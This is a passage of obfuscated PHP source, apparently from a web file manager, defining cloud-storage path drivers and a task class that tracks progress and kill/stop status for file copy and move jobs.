getContent($ƒ•Ïİ—¬) { $ƒ•Ïİ—¬ = $this->iconvSystem($ƒ•Ïİ—¬); return file_get_contents($ƒ•Ïİ—¬); } public function setContent($îë¹áÅç, $Ÿ°´Ñ¹ = '') { $îë¹áÅç = $this->iconvSystem($îë¹áÅç); $œñĞĞãÀ = @file_put_contents($îë¹áÅç, $Ÿ°´Ñ¹, LOCK_EX); if (!$œñĞĞãÀ) { $this->writeLog(__FUNCTION__ . $_SERVER[º·Ï‹¥³][1419], !0); } clearstatcache(); @chmod($îë¹áÅç, $this->pathAuth); return $œñĞĞãÀ === !1 ? !1 : !0; } public function fileSubstr($Ô¤«âğ¼, $¼˜âŞ¿î = 0, $•«±‡ëº = false) { $–¢Çµ“  =& $_SERVER[º·Ï‹¥³]; $Ô¤«âğ¼ = $this->iconvSystem($Ô¤«âğ¼); if ($•«±‡ëº === !1) { $•«±‡ëº = $this->size($Ô¤«âğ¼); } if ($•«±‡ëº <= 0) { return $–¢Çµ“ [12]; } $‘çõû‹ = fopen($Ô¤«âğ¼, $–¢Çµ“ [1427]); if (!$‘çõû‹) { return !1; } fseek_64($‘çõû‹, $¼˜âŞ¿î); $¬ÚÜ„œÅ = fread($‘çõû‹, $•«±‡ëº); fclose($‘çõû‹); if (!$¬ÚÜ„œÅ) { $this->writeLog(__FUNCTION__ . $–¢Çµ“ [1419], !0); } return $¬ÚÜ„œÅ; } public function upload($ê‰­å¿, $À‡ëÅÑî, $©îÙ÷­ = false, $’Ÿ…Š€ı = REPEAT_REPLACE) { if ($©îÙ÷­) { return $this->moveFile($À‡ëÅÑî, $ê‰­å¿); } return $this->copyFile($À‡ëÅÑî, $ê‰­å¿); } public function setModifyTime($ººäú¸×, $Û·Æ’ÂÌ = '') { @touch($ººäú¸×, intval($Û·Æ’ÂÌ)); } public function download($›ªšÃ—, $²éÛŸ“Á) { return $this->iconvSystem($›ªšÃ—); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($Äşğ˜Ê) { parent::__construct($Äşğ˜Ê); $this->setSignVersion($_SERVER[º·Ï‹¥³][238]); } public function fileOutImage($—µÉ°óû, $ÁóÛ¸•¡ = 250) { $ú½–Ù¥é =& $_SERVER[º·Ï‹¥³]; if ($this->size($—µÉ°óû) > 1024 * 1024 * 25) { return $this->fileOutImageServer($—µÉ°óû, $ÁóÛ¸•¡); } $¼çü‰¨ß = array($ú½–Ù¥é[1428] => $ú½–Ù¥é[1429] . $ÁóÛ¸•¡ . $ú½–Ù¥é[1430]); $–şè§‹ä = $this->link($—µÉ°óû, $¼çü‰¨ß); $this->fileOutLink($–şè§‹ä); } public function fileOutLink($Èë˜ï»û) { $‡¯·òêš =& $_SERVER[º·Ï‹¥³]; if (substr($Èë˜ï»û, 0, 7) == $‡¯·òêš[1377]) { $Èë˜ï»û = $‡¯·òêš[1378] . substr($Èë˜ï»û, 7); } header($‡¯·òêš[165] . $Èë˜ï»û); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ÕåúşœÊ) { parent::__construct($ÕåúşœÊ); $this->setSignVersion($_SERVER[º·Ï‹¥³][238]); } public function fileOutLink($Õ÷±òÄß) { $ ÒÜÖ¦µ =& $_SERVER[º·Ï‹¥³]; if (substr($Õ÷±òÄß, 0, 7) == $ ÒÜÖ¦µ[1377]) { $Õ÷±òÄß = $ ÒÜÖ¦µ[1378] . substr($Õ÷±òÄß, 7); } header($ ÒÜÖ¦µ[165] . $Õ÷±òÄß); die; } } goto FÌ‰†ÏŞ“‹; BÏµ‘ÓÁ“´: class Task { const STATYS_STOP = "\163\x74\x6f\x70"; const STATYS_RUNNING = "\x72\x75\x6e\156\x69\156\147"; const STATYS_KILL = "\153\151\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($›‡Îé®, $”ŸÀìşå = '', $¯Ï×Ãùã = 0, $…ğ§µ»© = '') { $ùÙ›¢ =& $_SERVER[º·Ï‹¥³]; if (self::get($›‡Îé®)) { return; } $this->task = array($ùÙ›¢[459] => $›‡Îé®, $ùÙ›¢[1754] => USER_ID, $ùÙ›¢[1643] => $…ğ§µ»©, $ùÙ›¢[510] => $ùÙ›¢[12], $ùÙ›¢[33] => $”ŸÀìşå, $ùÙ›¢[1114] => $ùÙ›¢[12], $ùÙ›¢[1112] => $¯Ï×Ãùã, $ùÙ›¢[1755] => 0, $ùÙ›¢[1756] => 0, $ùÙ›¢[1757] => 0, $ùÙ›¢[1758] => timeFloat(), $ùÙ›¢[1759] => 0, $ùÙ›¢[1760] => 0, $ùÙ›¢[1761] => 0, $ùÙ›¢[1762] => 0, $ùÙ›¢[802] => $ùÙ›¢[1704]); $GLOBALS[$ùÙ›¢[1763]] = 1; Hook::bind($ùÙ›¢[1708], array($this, $ùÙ›¢[1764])); Hook::bind($ùÙ›¢[1765], array($this, $ùÙ›¢[1766])); $this->startAfter(); Hook::trigger($ùÙ›¢[1767], $this->task); $this->task[$ùÙ›¢[1760]] = timeFloat(); } public function end($Àä Í…§ = '') { $‹½™Æ¬è =& $_SERVER[º·Ï‹¥³]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$‹½™Æ¬è[1760]]) { self::valueSet($this->task[$‹½™Æ¬è[459]], !1); } $this->isEnd = !0; if ($Àä Í…§) { $this->task[$‹½™Æ¬è[510]] = $Àä Í…§; } self::log($‹½™Æ¬è[1768] . $this->task[$‹½™Æ¬è[459]] . $‹½™Æ¬è[1769] . sprintf($‹½™Æ¬è[902], timeFloat() - $this->task[$‹½™Æ¬è[1758]]) . $‹½™Æ¬è[1770]); Hook::unbind($‹½™Æ¬è[1708], array($this, $‹½™Æ¬è[1764])); Hook::unbind($‹½™Æ¬è[1765], array($this, $‹½™Æ¬è[1766])); $this->endAfter(); $‘É€œ¯Ä = $this->task; $this->task = !1; Hook::trigger($‹½™Æ¬è[1771], $‘É€œ¯Ä); } public function update($Â§Ù¿­ = 0, $Š…Ã³Åå = false) { $÷Ä‰Ï± =& $_SERVER[º·Ï‹¥³]; $Ù†·õ‘ï =& $this->task; if (!$Ù†·õ‘ï) { return; } $Ù†·õ‘ï[$÷Ä‰Ï±[1755]] += $Â§Ù¿­; $Ù†·õ‘ï[$÷Ä‰Ï±[1759]] = timeFloat(); if ($Ù†·õ‘ï[$÷Ä‰Ï±[1112]]) { if ($Ù†·õ‘ï[$÷Ä‰Ï±[1112]] < $Ù†·õ‘ï[$÷Ä‰Ï±[1755]]) { $Ù†·õ‘ï[$÷Ä‰Ï±[1112]] = $Ù†·õ‘ï[$÷Ä‰Ï±[1755]]; } $çñ½èïİ = timeFloat() - $Ù†·õ‘ï[$÷Ä‰Ï±[1758]] - $Ù†·õ‘ï[$÷Ä‰Ï±[1761]]; if ($çñ½èïİ <= 0) { $çñ½èïİ = 0.001; } $Ù†·õ‘ï[$÷Ä‰Ï±[1756]] = $Ù†·õ‘ï[$÷Ä‰Ï±[1755]] / $Ù†·õ‘ï[$÷Ä‰Ï±[1112]]; $Ù†·õ‘ï[$÷Ä‰Ï±[1757]] = $Ù†·õ‘ï[$÷Ä‰Ï±[1755]] / $çñ½èïİ; if ($Ù†·õ‘ï[$÷Ä‰Ï±[1756]] > 0) { $Ù†·õ‘ï[$÷Ä‰Ï±[1762]] = $çñ½èïİ * (1 - $Ù†·õ‘ï[$÷Ä‰Ï±[1756]]) / $Ù†·õ‘ï[$÷Ä‰Ï±[1756]]; } $Ù†·õ‘ï[$÷Ä‰Ï±[1762]] = $Ù†·õ‘ï[$÷Ä‰Ï±[1762]] <= 0 ? 0 : $Ù†·õ‘ï[$÷Ä‰Ï±[1762]]; } $this->updateAfter(); $²ñ¸´ÍÙ = 0.2; if (timeFloat() - $Ù†·õ‘ï[$÷Ä‰Ï±[1760]] < $²ñ¸´ÍÙ && !$Š…Ã³Åå) { return; } $ ¾ÁØ¹ì = self::get($Ù†·õ‘ï[$÷Ä‰Ï±[459]]); $Ã•’…§™ = $ ¾ÁØ¹ì[$÷Ä‰Ï±[802]]; if ($Ã•’…§™ == self::STATYS_KILL) { $µ‹÷›ˆÛ = array($÷Ä‰Ï±[1772] => LNG($÷Ä‰Ï±[1773]), $÷Ä‰Ï±[1265] => !1); Cache::set($÷Ä‰Ï±[1774] . $this->task[$÷Ä‰Ï±[459]], $µ‹÷›ˆÛ, 30); $this->onKill(); $this->end(); die; } else { if ($Ã•’…§™ == self::STATYS_STOP) { $´¨©¥ã = 2; $ ¾ÁØ¹ì[$÷Ä‰Ï±[1761]] += $´¨©¥ã; self::valueSet($Ù†·õ‘ï[$÷Ä‰Ï±[459]], $ ¾ÁØ¹ì); sleep($´¨©¥ã); $this->update(); return; } } $Ù†·õ‘ï[$÷Ä‰Ï±[802]] = $Ã•’…§™ ? $Ã•’…§™ : $Ù†·õ‘ï[$÷Ä‰Ï±[802]]; $Ù†·õ‘ï[$÷Ä‰Ï±[1761]] = $ ¾ÁØ¹ì[$÷Ä‰Ï±[1761]] ? $ ¾ÁØ¹ì[$÷Ä‰Ï±[1761]] : 0; $Ù†·õ‘ï[$÷Ä‰Ï±[1760]] = timeFloat(); Hook::trigger($÷Ä‰Ï±[1775], $Ù†·õ‘ï); self::valueSet($Ù†·õ‘ï[$÷Ä‰Ï±[459]], $Ù†·õ‘ï); } public function onKillSet($ƒ³õê“°, $ÍÆõˆé = array()) { $this->onKillCall = array($ƒ³õê“°, $ÍÆõˆé); } public function onKill() { $‰Û„ ê± =& $_SERVER[º·Ï‹¥³]; self::log($‰Û„ ê±[1768] . $this->task[$‰Û„ ê±[459]] . $‰Û„ ê±[1776]); Hook::trigger($‰Û„ ê±[1777], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($‹¤Éí¨È) { $â®Ø§íğ =& $_SERVER[º·Ï‹¥³]; Cache::set($â®Ø§íğ[1774] . $this->task[$â®Ø§íğ[459]], $‹¤Éí¨È, 60); return $‹¤Éí¨È; } public static function get($º’·Æõ) { $òÈï¸Ü¨ =& $_SERVER[º·Ï‹¥³]; $…­°ª° = self::valueGet($º’·Æõ); if (is_array($…­°ª°) && $…­°ª°[$òÈï¸Ü¨[1778]]) { $µÜä’ß = ActionApply($…­°ª°[$òÈï¸Ü¨[1778]], array($…­°ª°)); $…­°ª° = is_array($µÜä’ß) ? $µÜä’ß : $…­°ª°; } return $…­°ª°; } public static function listData() { $ñæŠÔÍ° = self::valueGet(); return array_sort_by($ñæŠÔÍ°, $_SERVER[º·Ï‹¥³][1758], !0); } public static function kill($ÌÌØ§ÔÛ) { return self::changeStatus($ÌÌØ§ÔÛ, self::STATYS_KILL); } public static function stop($’šìïˆŠ) { return self::changeStatus($’šìïˆŠ, self::STATYS_STOP); } public static function restart($¢¸ÔêŒÖ) { return self::changeStatus($¢¸ÔêŒÖ, self::STATYS_RUNNING); } public static function killAll() { $ÊºÏ¥ˆ =& $_SERVER[º·Ï‹¥³]; $Üù–•Ù˜ = self::listData(); foreach ($Üù–•Ù˜ as $Êß¸€Şì) { self::kill($Êß¸€Şì[$ÊºÏ¥ˆ[459]]); } sleep(2); foreach ($Üù–•Ù˜ as $Êß¸€Şì) { self::valueSet($Êß¸€Şì[$ÊºÏ¥ˆ[459]], !1); } } private static function changeStatus($ğôáèµú, $ÇßœÅƒ) { $ÉÆøÍù§ =& $_SERVER[º·Ï‹¥³]; $ù¨œê¾É = self::valueGet($ğôáèµú); if (!$ù¨œê¾É) { return !1; } $ù¨œê¾É[$ÉÆøÍù§[802]] = $ÇßœÅƒ; self::valueSet($ğôáèµú, $ù¨œê¾É); self::log($ÉÆøÍù§[1779] . $ù¨œê¾É[$ÉÆøÍù§[459]] . $ÉÆøÍù§[1780] . $ÇßœÅƒ); return !0; } public static function valueGet($‡¥Š€€Ê = false) { $òÄë©„Ø =& $_SERVER[º·Ï‹¥³]; if ($‡¥Š€€Ê) { $È«í·æç = Model($òÄë©„Ø[504])->where(array($òÄë©„Ø[97] => $‡¥Š€€Ê, $òÄë©„Ø[33] => $òÄë©„Ø[1121]))->find(); return $È«í·æç ? json_decode($È«í·æç[$òÄë©„Ø[434]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Ï¢ª…Óç = false) { $«Ş‰‚¹­ =& $_SERVER[º·Ï‹¥³]; $·úÒœ¹ = array($«Ş‰‚¹­[33] => $«Ş‰‚¹­[1121]); if ($Ï¢ª…Óç) { $·úÒœ¹[$«Ş‰‚¹­[1754]] = $Ï¢ª…Óç; } $ã€¢Öù = Model($«Ş‰‚¹­[504])->where($·úÒœ¹)->select(); $ã€¢Öù = $ã€¢Öù ? $ã€¢Öù : array(); foreach ($ã€¢Öù as $÷±¡ÕÖ‰ => $èˆÕæœ) { $ã€¢Öù[$÷±¡ÕÖ‰] = json_decode($èˆÕæœ[$«Ş‰‚¹­[434]], !0); } return $ã€¢Öù; } public static function valueSet($¯Á§“­›, $‰´Ó¼í) { $ıÔÒ©øµ =& $_SERVER[º·Ï‹¥³]; if (!$‰´Ó¼í) { return Model($ıÔÒ©øµ[504])->where(array($ıÔÒ©øµ[97] => $¯Á§“­›, $ıÔÒ©øµ[33] => $ıÔÒ©øµ[1121]))->delete(); } $ğ®Ş¸Àæ = json_encode($‰´Ó¼í); if (!$ğ®Ş¸Àæ) { ob_start(); var_dump($‰´Ó¼í); $”µ˜¤·” = ob_get_clean(); self::log($ıÔÒ©øµ[1781] . json_encode_force($”µ˜¤·”)); } if (!$¯Á§“­› || !$‰´Ó¼í[$ıÔÒ©øµ[459]]) { return !1; } $ó°±Öû´ = array($ıÔÒ©øµ[33] => $ıÔÒ©øµ[1121], $ıÔÒ©øµ[1754] => USER_ID, $ıÔÒ©øµ[97] => $¯Á§“­›, $ıÔÒ©øµ[434] => $ğ®Ş¸Àæ); $ÉçÛóò = $ıÔÒ©øµ[1782]; CacheLock::lock($ÉçÛóò); Model($ıÔÒ©øµ[504])->add($ó°±Öû´, array(), !0); CacheLock::unlock($ÉçÛóò); } public static function log($ø”»³ù¹) { if (!GLOBAL_DEBUG) { return; } write_log($ø”»³ù¹, $_SERVER[º·Ï‹¥³][1783]); } } class TaskFileTransfer extends Task { protected function startAfter() { $¹Ø§ëÊ¨ =& $_SERVER[º·Ï‹¥³]; $¿ÏÑçªØ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¹Ø§ëÊ¨[1784], array($this, $¹Ø§ëÊ¨[1785])); Hook::bind($¹Ø§ëÊ¨[1276], array($this, $¹Ø§ëÊ¨[1786])); Hook::bind($¹Ø§ëÊ¨[1787], array($this, $¹Ø§ëÊ¨[1788])); Hook::bind($¹Ø§ëÊ¨[652], array($this, $¹Ø§ëÊ¨[1789])); Hook::bind($¹Ø§ëÊ¨[653], array($this, $¹Ø§ëÊ¨[1790])); Hook::bind($¹Ø§ëÊ¨[659], array($this, $¹Ø§ëÊ¨[1791])); Hook::bind($¹Ø§ëÊ¨[660], array($this, $¹Ø§ëÊ¨[1792])); Hook::bind($¹Ø§ëÊ¨[655], array($this, $¹Ø§ëÊ¨[1793])); Hook::bind($¹Ø§ëÊ¨[657], array($this, $¹Ø§ëÊ¨[1794])); Hook::bind($¹Ø§ëÊ¨[621], array($this, $¹Ø§ëÊ¨[1795])); Hook::bind($¹Ø§ëÊ¨[618], array($this, $¹Ø§ëÊ¨[1795])); Hook::bind($¹Ø§ëÊ¨[623], array($this, $¹Ø§ëÊ¨[1795])); Hook::bind($¹Ø§ëÊ¨[625], array($this, $¹Ø§ëÊ¨[1795])); Hook::bind($¹Ø§ëÊ¨[627], array($this, $¹Ø§ëÊ¨[1795])); Hook::bind($¹Ø§ëÊ¨[1796], array($this, $¹Ø§ëÊ¨[1797])); Hook::bind($¹Ø§ëÊ¨[643], array($this, $¹Ø§ëÊ¨[1798])); $this->sourceModelCopyFlag = !1; Hook::bind($¹Ø§ëÊ¨[1799], array($this, $¹Ø§ëÊ¨[1800])); Hook::bind($¹Ø§ëÊ¨[1801], array($this, $¹Ø§ëÊ¨[1802])); Hook::bind($¹Ø§ëÊ¨[1803], array($this, $¹Ø§ëÊ¨[1804])); $¿ÏÑçªØ[$¹Ø§ëÊ¨[1805]] = LNG($¹Ø§ëÊ¨[1806]); $¿ÏÑçªØ[$¹Ø§ëÊ¨[1807]] = 0; $¿ÏÑçªØ[$¹Ø§ëÊ¨[1808]] = 0; $¿ÏÑçªØ[$¹Ø§ëÊ¨[1114]] = $¹Ø§ëÊ¨[12]; $¿ÏÑçªØ[$¹Ø§ëÊ¨[1809]] = $¹Ø§ëÊ¨[12]; $¿ÏÑçªØ[$¹Ø§ëÊ¨[1810]] = 0; $¿ÏÑçªØ[$¹Ø§ëÊ¨[1811]] = 0; $¿ÏÑçªØ[$¹Ø§ëÊ¨[1812]] = 0; if (!$¿ÏÑçªØ[$¹Ø§ëÊ¨[1643]]) { $¿ÏÑçªØ[$¹Ø§ëÊ¨[1643]] = LNG($¹Ø§ëÊ¨[1813]); } } protected function endAfter() { $æèŒ‘ÅÅ =& $_SERVER[º·Ï‹¥³]; Hook::unbind($æèŒ‘ÅÅ[1784], array($this, $æèŒ‘ÅÅ[1785])); Hook::unbind($æèŒ‘ÅÅ[1276], array($this, $æèŒ‘ÅÅ[1786])); Hook::unbind($æèŒ‘ÅÅ[1787], array($this, $æèŒ‘ÅÅ[1788])); Hook::unbind($æèŒ‘ÅÅ[652], array($this, $æèŒ‘ÅÅ[1789])); Hook::unbind($æèŒ‘ÅÅ[653], array($this, $æèŒ‘ÅÅ[1790])); Hook::unbind($æèŒ‘ÅÅ[659], array($this, $æèŒ‘ÅÅ[1791])); Hook::unbind($æèŒ‘ÅÅ[660], array($this, $æèŒ‘ÅÅ[1792])); Hook::unbind($æèŒ‘ÅÅ[655], array($this, $æèŒ‘ÅÅ[1793])); Hook::unbind($æèŒ‘ÅÅ[657], array($this, $æèŒ‘ÅÅ[1794])); Hook::unbind($æèŒ‘ÅÅ[621], array($this, $æèŒ‘ÅÅ[1795])); Hook::unbind($æèŒ‘ÅÅ[618], array($this, $æèŒ‘ÅÅ[1795])); Hook::unbind($æèŒ‘ÅÅ[623], array($this, $æèŒ‘ÅÅ[1795])); Hook::unbind($æèŒ‘ÅÅ[625], array($this, $æèŒ‘ÅÅ[1795])); Hook::unbind($æèŒ‘ÅÅ[627], array($this, $æèŒ‘ÅÅ[1795])); Hook::unbind($æèŒ‘ÅÅ[1796], array($this, $æèŒ‘ÅÅ[1797])); Hook::unbind($æèŒ‘ÅÅ[643], array($this, $æèŒ‘ÅÅ[1798])); Hook::unbind($æèŒ‘ÅÅ[1799], array($this, $æèŒ‘ÅÅ[1800])); Hook::unbind($æèŒ‘ÅÅ[1801], array($this, $æèŒ‘ÅÅ[1802])); Hook::unbind($æèŒ‘ÅÅ[1803], array($this, $æèŒ‘ÅÅ[1804])); } public function copyMoveStart($¯à­òáµ, $’ÙÂñ¡, $ˆ†ÊÉ×, $Ù»‘¢ü¶) { $¡Å§Òèô =& $_SERVER[º·Ï‹¥³]; self::log($¡Å§Òèô[1814] . $’ÙÂñ¡ . $¡Å§Òèô[73] . $Ù»‘¢ü¶); $ğ´ÍÃ®™ = rtrim(TEMP_FILES, $¡Å§Òèô[8]); if (substr($’ÙÂñ¡, 0, strlen($ğ´ÍÃ®™)) == $ğ´ÍÃ®™) { return; } if (substr($Ù»‘¢ü¶, 0, strlen($ğ´ÍÃ®™)) == $ğ´ÍÃ®™) { return; } $“ô”ÉŠ· =& $this->task; $“ô”ÉŠ·[$¡Å§Òèô[1815]] = KodIO::transferType($¯à­òáµ, $ˆ†ÊÉ×); $this->update(); } public function updateAfter() { $ŠË µ® =& $_SERVER[º·Ï‹¥³]; $†×Á¾Å† =& $this->task; if (!$†×Á¾Å†[$ŠË µ®[815]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($†×Á¾Å†[$ŠË µ®[1815]] == $ŠË µ®[1368]) { return; } self::updateTask($†×Á¾Å†); } private static function updateTask(&$À­ºÕËœ) { $´‰à´Şİ =& $_SERVER[º·Ï‹¥³]; if ($À­ºÕËœ[$´‰à´Şİ[1815]] == $´‰à´Şİ[1247] || $À­ºÕËœ[$´‰à´Şİ[1815]] == $´‰à´Şİ[110]) { if ($À­ºÕËœ[$´‰à´Şİ[1809]]) { $À­ºÕËœ[$´‰à´Şİ[1812]] = $À­ºÕËœ[$´‰à´Şİ[1811]] + $À­ºÕËœ[$´‰à´Şİ[1808]]; } } else { if ($À­ºÕËœ[$´‰à´Şİ[1815]] == $´‰à´Şİ[1369]) { if ($À­ºÕËœ[$´‰à´Şİ[1809]] == $´‰à´Şİ[1247]) { $À­ºÕËœ[$´‰à´Şİ[1812]] = $À­ºÕËœ[$´‰à´Şİ[1811]] + $À­ºÕËœ[$´‰à´Şİ[1808]] * 0.5; } else { if ($À­ºÕËœ[$´‰à´Şİ[1809]] == $´‰à´Şİ[110]) { $À­ºÕËœ[$´‰à´Şİ[1812]] = $À­ºÕËœ[$´‰à´Şİ[1811]] + $À­ºÕËœ[$´‰à´Şİ[1807]] * 0.5 + $À­ºÕËœ[$´‰à´Şİ[1808]] * 0.5; } } } } $À­ºÕËœ[$´‰à´Şİ[1756]] = $À­ºÕËœ[$´‰à´Şİ[1812]] / $À­ºÕËœ[$´‰à´Şİ[815]]; if ($À­ºÕËœ[$´‰à´Şİ[1756]] > 0) { $Àá×½‹ = timeFloat() - $À­ºÕËœ[$´‰à´Şİ[1758]] - $À­ºÕËœ[$´‰à´Şİ[1761]]; $À­ºÕËœ[$´‰à´Şİ[1762]] = $Àá×½‹ * (1 - $À­ºÕËœ[$´‰à´Şİ[1756]]) / $À­ºÕËœ[$´‰à´Şİ[1756]]; } } public function addPath($Œ’é‹Û¼) { $€´…¾¥ =& $_SERVER[º·Ï‹¥³]; if (!$Œ’é‹Û¼) { return; } $á†ÆÆøØ =& $this->task; $Éœë€ÖÆ = IO::infoWithChildren($Œ’é‹Û¼); $°­”ÉçÀ = $á†ÆÆøØ[$€´…¾¥[1816]] ? $á†ÆÆøØ[$€´…¾¥[1816]][$€´…¾¥[1817]] : 0; $á†ÆÆøØ[$€´…¾¥[1816]] = array($€´…¾¥[1817] => $°­”ÉçÀ + 1, $€´…¾¥[478] => $Éœë€ÖÆ[$€´…¾¥[32]], $€´…¾¥[87] => $Éœë€ÖÆ[$€´…¾¥[87]], $€´…¾¥[567] => $Éœë€ÖÆ[$€´…¾¥[567]] ? $Éœë€ÖÆ[$€´…¾¥[567]] : $Éœë€ÖÆ[$€´…¾¥[87]]); if ($Éœë€ÖÆ[$€´…¾¥[33]] == $€´…¾¥[221]) { $á†ÆÆøØ[$€´…¾¥[1112]] += 1; } else { $á†ÆÆøØ[$€´…¾¥[1112]] += $Éœë€ÖÆ[$€´…¾¥[82]][$€´…¾¥[80]]; if ($Éœë€ÖÆ[$€´…¾¥[184]]) { $á†ÆÆøØ[$€´…¾¥[1112]] += $Éœë€ÖÆ[$€´…¾¥[82]][$€´…¾¥[81]] + 1; } } $á†ÆÆøØ[$€´…¾¥[815]] += $Éœë€ÖÆ[$€´…¾¥[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($åÖßÃ—Å) { } public function sourceAddHashEnd($ºÀ´Èã) { } public function sourceAddFileStart($½åƒêƒ‡) { $Ÿã‹‰ÏÁ =& $_SERVER[º·Ï‹¥³]; $ÕñÉî‡ˆ =& $this->task; $ÕñÉî‡ˆ[$Ÿã‹‰ÏÁ[1807]] = $½åƒêƒ‡[$Ÿã‹‰ÏÁ[79]]; $ÕñÉî‡ˆ[$Ÿã‹‰ÏÁ[1805]] = $½åƒêƒ‡[$Ÿã‹‰ÏÁ[32]]; $ÕñÉî‡ˆ[$Ÿã‹‰ÏÁ[1114]] = $½åƒêƒ‡[$Ÿã‹‰ÏÁ[32]]; $ÕñÉî‡ˆ[$Ÿã‹‰ÏÁ[1818]] = $½åƒêƒ‡[$Ÿã‹‰ÏÁ[87]]; $this->update(); } public function sourceAddFileEnd($¶¸ƒ»Òì) { $×Ë´”’É =& $_SERVER[º·Ï‹¥³]; $ĞòÛªƒ¤ =& $this->task; $ĞòÛªƒ¤[$×Ë´”’É[1812]] += $¶¸ƒ»Òì[$×Ë´”’É[79]]; $ĞòÛªƒ¤[$×Ë´”’É[1818]] = $¶¸ƒ»Òì[$×Ë´”’É[87]]; $this->update(1); } public function copyFileStart($ˆï½¾Ê¾, $—å¼‰¡ , $ÂœŒ”‡Ô, $Ä÷åÈ£Ù, $²‘ı½³, $òıË˜½«) { $æƒÇãØ =& $_SERVER[º·Ï‹¥³]; $œÙñ¹Öª = $²‘ı½³; if ($œÙñ¹Öª == $GLOBALS[$æƒÇãØ[1819]]) { $œÙñ¹Öª = $GLOBALS[$æƒÇãØ[1820]]; } $GLOBALS[$æƒÇãØ[1820]] = $²‘ı½³; $GLOBALS[$æƒÇãØ[1819]] = $òıË˜½«; $ Ö‘Ô¯ =& $this->task; $ Ö‘Ô¯[$æƒÇãØ[1805]] = $œÙñ¹Öª; $ Ö‘Ô¯[$æƒÇãØ[1807]] = (int) $ˆï½¾Ê¾->size($—å¼‰¡ ); $ Ö‘Ô¯[$æƒÇãØ[1808]] = 0; $ Ö‘Ô¯[$æƒÇãØ[1114]] = $æƒÇãØ[12]; $ Ö‘Ô¯[$æƒÇãØ[1809]] = $æƒÇãØ[12]; $ Ö‘Ô¯[$æƒÇãØ[1810]] = 0; $ëÓ¹ú³è = $ Ö‘Ô¯[$æƒÇãØ[1807]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ Ö‘Ô¯[$æƒÇãØ[459]] . $æƒÇãØ[1821]); if ($ëÓ¹ú³è && file_exists(get_path_father($Ä÷åÈ£Ù))) { Cache::set($ Ö‘Ô¯[$æƒÇãØ[459]] . $æƒÇãØ[1821], $Ä÷åÈ£Ù); $ Ö‘Ô¯[$æƒÇãØ[1778]] = array($æƒÇãØ[1822], $æƒÇãØ[1823]); } $this->update(0, $ëÓ¹ú³è); } public static function updateCopyLocalFileSize($—¤ä†î–) { $®‹á´Ä™ =& $_SERVER[º·Ï‹¥³]; $–Ç±½„Ö = Cache::get($—¤ä†î–[$®‹á´Ä™[459]] . $®‹á´Ä™[1821]); if (!$–Ç±½„Ö || !file_exists($–Ç±½„Ö)) { return $—¤ä†î–; } $—¤ä†î–[$®‹á´Ä™[1808]] = @filesize($–Ç±½„Ö); $—¤ä†î–[$®‹á´Ä™[1812]] += $—¤ä†î–[$®‹á´Ä™[1808]]; self::updateTask($—¤ä†î–); return $—¤ä†î–; } public function copyFileEnd($Š²ıà¾ü, $”½Ü–Çæ, $›©à¥‚ç, $‹ôÂÂ¤, $ˆÃˆ›”, $ƒãËÛÕƒ) { $àì Î§ =& $_SERVER[º·Ï‹¥³]; $–‘î‹Éğ =& $this->task; $–‘î‹Éğ[$àì Î§[1808]] = $–‘î‹Éğ[$àì Î§[1807]]; $–‘î‹Éğ[$àì Î§[1809]] = $àì Î§[12]; unset($–‘î‹Éğ[$àì Î§[1778]]); if ($ˆÃˆ›” == $–‘î‹Éğ[$àì Î§[1805]]) { $–‘î‹Éğ[$àì Î§[1811]] += $–‘î‹Éğ[$àì Î§[1807]]; $–‘î‹Éğ[$àì Î§[1812]] = $–‘î‹Éğ[$àì Î§[1811]]; $ïˆµæµÀ = 1; if (isset($–‘î‹Éğ[$àì Î§[1818]]) && $–‘î‹Éğ[$àì Î§[1818]] == $”½Ü–Çæ) { $ïˆµæµÀ = 0; } $this->update($ïˆµæµÀ); } else { $this->update(); $–‘î‹Éğ[$àì Î§[1808]] = 0; } Cache::remove($–‘î‹Éğ[$àì Î§[459]] . $àì Î§[1821]); self::log($àì Î§[1824] . $”½Ü–Çæ . $àì Î§[73] . $‹ôÂÂ¤ . $àì Î§[253] . $ˆÃˆ›” . $àì Î§[1825] . $–‘î‹Éğ[$àì Î§[1805]]); } public function updateFileEnd($ŠØ÷é¹, $£Ç™Û•Ô) { $¸ˆıòñ¦ =& $_SERVER[º·Ï‹¥³]; $ïàåûşÏ =& $this->task; $ïàåûşÏ[$¸ˆıòñ¦[1805]] = $ŠØ÷é¹; $ïàåûşÏ[$¸ˆıòñ¦[1807]] = $£Ç™Û•Ô; $ïàåûşÏ[$¸ˆıòñ¦[1811]] += $£Ç™Û•Ô; $ïàåûşÏ[$¸ˆıòñ¦[1812]] = $ïàåûşÏ[$¸ˆıòñ¦[1811]]; $this->update(1); self::log($¸ˆıòñ¦[1826] . $ŠØ÷é¹); } public function sourceModelCopy($ûŠµ”ÔÁ) { $–†•âµà =& $_SERVER[º·Ï‹¥³]; $´İ¾ó = $ûŠµ”ÔÁ[0]; $áß¶ëŸ = $ûŠµ”ÔÁ[1]; $”ù¸®ÆÕ =& $this->task; $this->sourceModelCopyFlag = !0; $üÆ´—Éë = 0; switch ($´İ¾ó) { case $–†•âµà[619]: $üÆ´—Éë = 1; break; case $–†•âµà[622]: $”ù¸®ÆÕ[$–†•âµà[1805]] = $áß¶ëŸ[$–†•âµà[32]]; break; case $–†•âµà[624]: $üÆ´—Éë = intval($ûŠµ”ÔÁ[$–†•âµà[440]] * 0.4); break; case $–†•âµà[626]: $üÆ´—Éë = intval($ûŠµ”ÔÁ[$–†•âµà[440]] * 0.2); break; case $–†•âµà[628]: $üÆ´—Éë = intval($ûŠµ”ÔÁ[$–†•âµà[440]] * 0.4); break; } $this->update($üÆ´—Éë); $this->sourceModelCopyFlag = !1; } public function 